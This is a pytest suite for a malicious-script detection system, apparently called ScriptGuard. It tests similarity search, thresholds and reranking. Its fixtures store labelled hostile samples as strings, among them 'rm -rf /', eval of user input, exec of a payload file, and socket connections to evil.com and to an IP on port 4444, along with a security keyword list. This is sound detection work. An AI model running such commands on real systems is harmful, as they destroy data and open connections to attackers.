"""
Comprehensive Test Suite for Enhanced RAG Features (Graceful Fallback, Thresholds, Reranking)
Tests for P0 requirements: guaranteed k results, configurable thresholds, and reranking.
"""

import os
import sys
import pytest
from typing import List, Dict, Any

# Add project root to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../..')))

from src.scriptguard.rag.code_similarity_store import CodeSimilarityStore
from src.scriptguard.rag.reranking_service import RerankingService


class TestGracefulFallback:
    """Test suite for graceful fallback mechanism (P0 Requirement 1)."""

    @pytest.fixture
    def store(self):
        """Create store with test collection."""
        store = CodeSimilarityStore(
            collection_name="test_fallback_enhanced",
            config_path="../../config.yaml"
        )
        # Clear any existing data
        store.clear_collection()
        return store

    @pytest.fixture
    def test_samples(self):
        """Create test samples with different characteristics."""
        return [
            {
                "id": 1,
                "content": "import os\nos.system('rm -rf /')",
                "label": "malicious",
                "source": "test"
            },
            {
                "id": 2,
                "content": "import subprocess\nsubprocess.call(['whoami'])",
                "label": "malicious",
                "source": "test"
            },
            {
                "id": 3,
                "content": "import pandas as pd\ndf = pd.read_csv('data.csv')",
                "label": "benign",
                "source": "test"
            },
            {
                "id": 4,
                "content": "import numpy as np\narr = np.array([1, 2, 3])",
                "label": "benign",
                "source": "test"
            },
            {
                "id": 5,
                "content": "import requests\nrequests.get('http://example.com')",
                "label": "benign",
                "source": "test"
            }
        ]

    def test_exact_k_results_with_high_threshold(self, store, test_samples):
        """DoD: System always returns exactly k results even with restrictive threshold."""
        # Upsert test samples
        store.upsert_code_samples(test_samples)

        # Test case 1: Very high threshold (would normally filter everything)
        results = store.search_similar_code(
            query_code="import os\nos.system('ls')",
            k=3,
            score_threshold=0.99,  # Extremely high threshold
            balance_labels=False
        )

        assert len(results) == 3, f"Expected exactly 3 results, got {len(results)}"
        print(f"✓ TEST PASSED: Graceful fallback provided {len(results)} results with threshold=0.99")

    def test_exact_k_for_all_odd_values(self, store, test_samples):
        """DoD: Test k ∈ {1, 3, 5} in all scenarios."""
        store.upsert_code_samples(test_samples)

        for k in [1, 3, 5]:
            results = store.search_similar_code(
                query_code="import pandas as pd",
                k=k,
                balance_labels=False
            )

            assert len(results) == min(k, len(test_samples)), \
                f"For k={k}, expected {min(k, len(test_samples))} results, got {len(results)}"
            print(f"✓ TEST PASSED: k={k} returned exactly {len(results)} results")

    def test_empty_collection_graceful_handling(self, store):
        """DoD: Empty collection returns empty list without error."""
        # Don't insert any samples
        results = store.search_similar_code(
            query_code="import os",
            k=3
        )

        assert len(results) == 0, "Expected empty results for empty collection"
        print("✓ TEST PASSED: Empty collection handled gracefully")

    def test_label_balance_min_per_label_guaranteed(self, store, test_samples):
        """DoD: When balance_labels=True, ensure min_per_label is satisfied."""
        store.upsert_code_samples(test_samples)

        # Configure min_per_label in store
        store.min_per_label = 1
        store.ensure_label_balance = True

        results = store.search_similar_code(
            query_code="import os",
            k=5,
            balance_labels=True
        )

        # Count labels
        malicious_count = sum(1 for r in results if r["label"] == "malicious")
        benign_count = sum(1 for r in results if r["label"] == "benign")

        assert malicious_count >= 1, f"Expected at least 1 malicious, got {malicious_count}"
        assert benign_count >= 1, f"Expected at least 1 benign, got {benign_count}"

        print(f"✓ TEST PASSED: Label balance satisfied - {malicious_count} malicious, {benign_count} benign")

    def test_threshold_utoi_wszystko_scenario(self, store, test_samples):
        """DoD: Test scenario where threshold filters all results."""
        store.upsert_code_samples(test_samples)

        # Use query that's very different from any sample
        results = store.search_similar_code(
            query_code="x = 1 + 1",  # Simple math, no similarity to samples
            k=3,
            score_threshold=0.90,  # High threshold
            balance_labels=False
        )

        # Graceful fallback should still provide results
        assert len(results) > 0, "Expected fallback to provide results even with high threshold"
        print(f"✓ TEST PASSED: Fallback provided {len(results)} results when primary threshold filtered all")


class TestConfigurableThresholds:
    """Test suite for configurable score thresholds (P0 Requirement 2)."""

    @pytest.fixture
    def store(self):
        """Create store with configuration."""
        return CodeSimilarityStore(
            collection_name="test_thresholds_enhanced",
            config_path="../../config.yaml"
        )

    def test_thresholds_loaded_from_config(self, store):
        """DoD: Thresholds are loaded from config.yaml per model."""
        assert "default" in store.score_thresholds
        assert "strict" in store.score_thresholds
        assert "lenient" in store.score_thresholds

        print(f"✓ TEST PASSED: Thresholds loaded for model {store.embedding_model}:")
        print(f"  - Default: {store.score_thresholds['default']}")
        print(f"  - Strict:  {store.score_thresholds['strict']}")
        print(f"  - Lenient: {store.score_thresholds['lenient']}")

    def test_threshold_ordering_correct(self, store):
        """DoD: Verify lenient < default < strict."""
        default = store.get_threshold("default")
        strict = store.get_threshold("strict")
        lenient = store.get_threshold("lenient")

        assert lenient < default < strict, \
            f"Expected lenient < default < strict, got {lenient} < {default} < {strict}"

        print(f"✓ TEST PASSED: Threshold ordering correct: {lenient:.3f} < {default:.3f} < {strict:.3f}")

    def test_threshold_modes_in_search(self, store):
        """DoD: Different threshold modes produce different result sets."""
        test_samples = [
            {"id": 1, "content": "import os\nos.system('ls')", "label": "malicious", "source": "test"},
            {"id": 2, "content": "import os\nos.system('pwd')", "label": "malicious", "source": "test"},
            {"id": 3, "content": "import pandas as pd", "label": "benign", "source": "test"},
            {"id": 4, "content": "import numpy as np", "label": "benign", "source": "test"}
        ]
        store.upsert_code_samples(test_samples)

        query = "import os\nos.system('whoami')"

        # Test with different modes
        results_lenient = store.search_similar_code(query, k=3, threshold_mode="lenient")
        results_default = store.search_similar_code(query, k=3, threshold_mode="default")
        results_strict = store.search_similar_code(query, k=3, threshold_mode="strict")

        # All should return exactly k=3 (graceful fallback)
        assert len(results_lenient) == 3
        assert len(results_default) == 3
        assert len(results_strict) == 3

        print(f"✓ TEST PASSED: All threshold modes returned k=3 results")
        print(f"  - Lenient: avg score = {sum(r['score'] for r in results_lenient)/3:.3f}")
        print(f"  - Default: avg score = {sum(r['score'] for r in results_default)/3:.3f}")
        print(f"  - Strict:  avg score = {sum(r['score'] for r in results_strict)/3:.3f}")

    def test_explicit_threshold_override(self, store):
        """DoD: Explicit score_threshold parameter overrides threshold_mode."""
        test_samples = [
            {"id": 1, "content": "import os", "label": "malicious", "source": "test"},
            {"id": 2, "content": "import sys", "label": "benign", "source": "test"}
        ]
        store.upsert_code_samples(test_samples)

        # Use explicit threshold
        results = store.search_similar_code(
            query_code="import os",
            k=2,
            score_threshold=0.5,  # Explicit
            threshold_mode="lenient"  # Should be ignored
        )

        # Verify explicit threshold was used (check logs or behavior)
        assert len(results) > 0, "Expected results with explicit threshold"
        print(f"✓ TEST PASSED: Explicit threshold override worked")


class TestReranking:
    """Test suite for reranking functionality (P1 Requirement 3)."""

    @pytest.fixture
    def reranker(self):
        """Create reranking service with heuristic strategy."""
        return RerankingService(
            strategy="heuristic",
            security_keywords=["os.system", "subprocess", "eval", "exec"],
            boost_factor=1.5,
            diversity_penalty=0.8,
            similarity_threshold=0.9
        )

    @pytest.fixture
    def mock_results(self):
        """Create mock search results for reranking tests."""
        return [
            {
                "score": 0.75,
                "code": "import os\nos.system('ls')",
                "label": "malicious",
                "db_id": 1
            },
            {
                "score": 0.70,
                "code": "import pandas as pd\ndf = pd.read_csv('data.csv')",
                "label": "benign",
                "db_id": 2
            },
            {
                "score": 0.65,
                "code": "import subprocess\nsubprocess.call(['whoami'])",
                "label": "malicious",
                "db_id": 3
            },
            {
                "score": 0.60,
                "code": "import numpy as np\narr = np.array([1, 2, 3])",
                "label": "benign",
                "db_id": 4
            }
        ]

    def test_heuristic_security_keyword_boost(self, reranker, mock_results):
        """DoD: Results with security keywords have boosted scores."""
        original_scores = {r["db_id"]: r["score"] for r in mock_results}

        reranked = reranker.rerank(
            query_code="import os",
            results=[r.copy() for r in mock_results],
            k=None
        )

        # Check that security-relevant results were boosted
        boosted_count = 0
        for result in reranked:
            if any(kw in result["code"] for kw in ["os.system", "subprocess"]):
                if result.get("boosted", False):
                    boosted_count += 1
                    original = original_scores[result["db_id"]]
                    new = result["score"]
                    assert new > original, f"Expected boost: {original} -> {new}"
                    print(f"  ✓ Result {result['db_id']} boosted: {original:.3f} → {new:.3f}")

        assert boosted_count > 0, "Expected at least one result to be boosted"
        print(f"✓ TEST PASSED: {boosted_count} results boosted for security keywords")

    def test_diversity_penalty_for_near_duplicates(self, reranker):
        """DoD: Near-duplicate results receive diversity penalty."""
        # Create results with near-duplicate code
        duplicate_results = [
            {
                "score": 0.80,
                "code": "import os\nos.system('rm -rf /')",
                "label": "malicious",
                "db_id": 1
            },
            {
                "score": 0.79,
                "code": "import os\nos.system('rm -rf /')",  # Exact duplicate
                "label": "malicious",
                "db_id": 2
            },
            {
                "score": 0.70,
                "code": "import pandas as pd",
                "label": "benign",
                "db_id": 3
            }
        ]

        reranked = reranker.rerank(
            query_code="import os",
            results=[r.copy() for r in duplicate_results],
            k=None
        )

        # Second result should have diversity penalty
        penalized = [r for r in reranked if r.get("diversity_penalized", False)]
        assert len(penalized) > 0, "Expected at least one result to be penalized for diversity"
        print(f"✓ TEST PASSED: Diversity penalty applied to {len(penalized)} near-duplicate results")

    def test_reranking_preserves_k_limit(self, reranker, mock_results):
        """DoD: Reranking respects k parameter."""
        k = 2
        reranked = reranker.rerank(
            query_code="import os",
            results=[r.copy() for r in mock_results],
            k=k
        )

        assert len(reranked) == k, f"Expected exactly {k} results after reranking, got {len(reranked)}"
        print(f"✓ TEST PASSED: Reranking preserved k={k} limit")

    def test_reranking_reduces_false_positives(self, reranker):
        """DoD: Reranking improves relevance by penalizing false positives."""
        # Create scenario where benign code with 'socket' library
        # might be confused with malicious network code
        results = [
            {
                "score": 0.80,
                "code": "import socket\ns = socket.socket()\ns.connect(('192.168.1.1', 4444))",  # Malicious
                "label": "malicious",
                "db_id": 1
            },
            {
                "score": 0.78,
                "code": "import socket\nhostname = socket.gethostname()",  # Benign usage
                "label": "benign",
                "db_id": 2
            },
            {
                "score": 0.75,
                "code": "import pandas as pd",  # Completely different
                "label": "benign",
                "db_id": 3
            }
        ]

        reranked = reranker.rerank(
            query_code="import socket\ns.connect(('evil.com', 4444))",
            results=[r.copy() for r in results],
            k=None
        )

        # Malicious result with 'connect' should be boosted more
        top_result = reranked[0]
        assert "connect" in top_result["code"] or "socket" in top_result["code"]
        print(f"✓ TEST PASSED: Reranking prioritized relevant security pattern")


class TestIntegrationEndToEnd:
    """Integration tests for complete workflow with all enhancements."""

    @pytest.fixture
    def store(self):
        """Create fully-configured store."""
        store = CodeSimilarityStore(
            collection_name="test_e2e_enhanced",
            config_path="../../config.yaml"
        )
        store.clear_collection()
        return store

    @pytest.fixture
    def comprehensive_samples(self):
        """Comprehensive test dataset with various code patterns."""
        return [
            # Malicious with high-risk patterns
            {"id": 1, "content": "import os\nos.system('rm -rf /')", "label": "malicious", "source": "test"},
            {"id": 2, "content": "import subprocess\nsubprocess.call(['whoami'])", "label": "malicious", "source": "test"},
            {"id": 3, "content": "eval(input('Enter code: '))", "label": "malicious", "source": "test"},
            {"id": 4, "content": "exec(open('payload.py').read())", "label": "malicious", "source": "test"},

            # Benign data science code
            {"id": 5, "content": "import pandas as pd\ndf = pd.read_csv('data.csv')", "label": "benign", "source": "test"},
            {"id": 6, "content": "import numpy as np\narr = np.array([1, 2, 3])", "label": "benign", "source": "test"},
            {"id": 7, "content": "import matplotlib.pyplot as plt\nplt.plot([1,2,3])", "label": "benign", "source": "test"},

            # Edge cases
            {"id": 8, "content": "import socket\nhostname = socket.gethostname()", "label": "benign", "source": "test"},
            {"id": 9, "content": "import socket\ns = socket.socket()\ns.connect(('evil.com', 4444))", "label": "malicious", "source": "test"}
        ]

    def test_complete_workflow_all_features(self, store, comprehensive_samples):
        """DoD: End-to-end test with graceful fallback, thresholds, and reranking."""
        # 1. Upsert samples
        store.upsert_code_samples(comprehensive_samples)
        print("✓ Phase 1: Samples upserted")

        # 2. Search with all features enabled
        results = store.search_similar_code(
            query_code="import os\nos.system('ls')",
            k=5,
            balance_labels=True,
            threshold_mode="default",
            enable_reranking=True
        )

        # Verify: Exactly k=5 results
        assert len(results) == 5, f"Expected exactly 5 results, got {len(results)}"
        print(f"✓ Phase 2: Got exactly {len(results)} results")

        # Verify: Label balance
        malicious_count = sum(1 for r in results if r["label"] == "malicious")
        benign_count = sum(1 for r in results if r["label"] == "benign")
        assert malicious_count >= 1, "Expected at least 1 malicious result"
        assert benign_count >= 1, "Expected at least 1 benign result"
        print(f"✓ Phase 3: Label balance satisfied ({malicious_count} malicious, {benign_count} benign)")

        # Verify: Reranking effect (top results should be security-relevant)
        top_3_codes = [r["code"] for r in results[:3]]
        security_keywords_in_top_3 = sum(
            1 for code in top_3_codes
            if any(kw in code for kw in ["os.system", "subprocess", "eval", "exec", "socket"])
        )
        print(f"✓ Phase 4: Top 3 results contain {security_keywords_in_top_3} security-relevant samples")

        # Print detailed results
        print("\n  Detailed Results:")
        for i, r in enumerate(results, 1):
            print(f"    {i}. [{r['label']:10s}] score={r['score']:.3f} | {r['code'][:60]}...")

        print("\n✓ TEST PASSED: Complete E2E workflow successful")

    def test_stress_multiple_queries_stability(self, store, comprehensive_samples):
        """DoD: System remains stable under multiple queries."""
        store.upsert_code_samples(comprehensive_samples)

        queries = [
            "import os",
            "import pandas",
            "eval(code)",
            "subprocess.call",
            "socket.socket",
            "numpy.array",
            "plt.plot",
            "exec(payload)"
        ]

        for i, query in enumerate(queries, 1):
            results = store.search_similar_code(
                query_code=query,
                k=3,
                balance_labels=True,
                enable_reranking=True
            )
            assert len(results) == 3, f"Query {i} failed: expected 3 results, got {len(results)}"

        print(f"✓ TEST PASSED: Stress test - {len(queries)} queries executed successfully")


def run_all_tests():
    """Run complete test suite."""
    print("=" * 80)
    print(" ENHANCED RAG TEST SUITE - P0 FEATURES")
    print("  1. Graceful Fallback (guaranteed k results)")
    print("  2. Configurable Thresholds (per-model calibration)")
    print("  3. Reranking (heuristic + diversity)")
    print("=" * 80)
    print()

    # Run pytest with verbose output
    exit_code = pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "-s",  # Show print statements
        "--color=yes"
    ])

    return exit_code


if __name__ == "__main__":
    exit(run_all_tests())
